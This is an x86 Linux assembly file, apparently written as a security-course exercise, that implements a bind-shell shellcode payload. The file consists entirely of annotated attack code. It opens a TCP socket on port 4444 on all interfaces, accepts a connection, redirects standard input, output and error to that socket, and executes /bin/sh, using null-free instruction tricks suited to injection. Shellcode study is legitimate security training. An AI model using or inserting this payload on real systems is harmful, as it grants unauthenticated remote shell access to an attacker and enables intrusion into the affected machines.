; Purpose:      Linux x86 Bind Shell
; Author:       Mohit Suyal (@mosunit)
; Studen ID:    PA-16521
; Blog:         https://mosunit.com

global _start

section .text

_start:

; Creating a socket

        ; move decimal 102 in eax - socketcall syscall
        xor eax, eax
        mov al, 0x66    ;converted to hex

        ; set the call argument to 1 - SOCKET syscall
        xor ebx, ebx
        mov bl, 0x1

        ; push value of protocol, type and domain on stack - socket syscall
        ; int socket(int domain, int type, int protocol);
        ; arguments pushed in reverse order
        xor ecx, ecx
        push ecx        ; Protocol = 0
        push 0x1        ; Type = 1 (SOCK_STREAM)
        push 0x2        ; Domain = 2 (AF_INET)

        ; set value of ecx to point to top of stack - points to block of arguments for socketcall syscall
        mov ecx, esp

        int 0x80

; Binding a socket

        ; save return value of socket syscall - socket file descriptor
        xor edx, edx
        mov edx, eax

        ; move decimal 102 in eax - socketcall syscall
        mov al, 0x66    ;converted to hex

        ; set the call argument to 2 - bind syscall
        mov bl, 0x2

        ; push sockaddr structure on the stack
        ; struct sockaddr {
        ;       sa_family_t sa_family;
        ;       char        sa_data[14];
        ;       }
        xor ecx, ecx
        push ecx                ; s_addr = any(0.0.0.0)
        push word 0x5c11        ; port = 4444
        push word 0x2           ; family = AF_INET

        mov esi, esp            ; save address of sockaddr struct

        ; push values of addrlen, addr and sockfd on the stack
        ; bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
        push 0x10               ; strlen =16
        push esi                ; address of sockaddr structure
        push edx                ; file descriptor returned from socket syscall

        ; set value of ecx to point to top of stack - points to block of arguments for bind syscall
        mov ecx, esp
        int 0x80

; Listen for a connection

        ; move decimal 102 in eax - socketcall syscall
        mov al, 0x66    ;converted to hex

        ; set the call argument to 4 - listen syscall
        mov bl, 0x4

        ; push arguments for socketcall syscall
        ; int listen(int sockfd, int backlog)
        push byte 0x2
        push edx

        ;set value of ecx to point ot top of stack - points to block of arguments for listen syscall
        mov ecx, esp
        int 0x80

; Accept a connection

        ; move decimal 102 in eax - socketcall syscall
        mov al, 0x66


        ; set the call argument to 5 - accept syscall
         mov bl, 0x5

        ; push arguments for socketcall syscall
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        xor ecx, ecx
        push ecx
        push ecx
        push edx

        ;set value of ecx to point ot top of stack - points to block of arguments for listen syscall
        mov ecx, esp
        int 0x80

; Duplicate file descriptors

        ; eax holds return value of previous syscall - accept - client_sockid
        ; client socket file descriptor
        push eax

        ; push arguments for dup2 syscall
        ; int dup2(int oldfd, int newfd);
        ; dup2 syscall - setting STDIN;
        mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
        pop ebx                 ; set ebx to client sockid
        xor ecx, ecx
        int 0x80

        ; dup2 syscall - setting STDOUT
        mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
        mov cl, 0x1
        int 0x80

        ; dup2 syscall - setting STDERR
        mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
        mov cl, 0x2
        int 0x80

; Execute /bin/sh

        ; exeve syscall
        mov al, 0xb

        ; int execve(const char *pathname, char *const argv[], char *const envp[]);
        ; push //bin/sh on stack
        xor ebx, ebx
        push ebx                ; Null
        push 0x68732f6e         ; hs/n : 68732f6e
        push 0x69622f2f         ; ib// : 69622f2f
        mov ebx, esp

        xor ecx, ecx
        xor edx, edx

        int 0x80
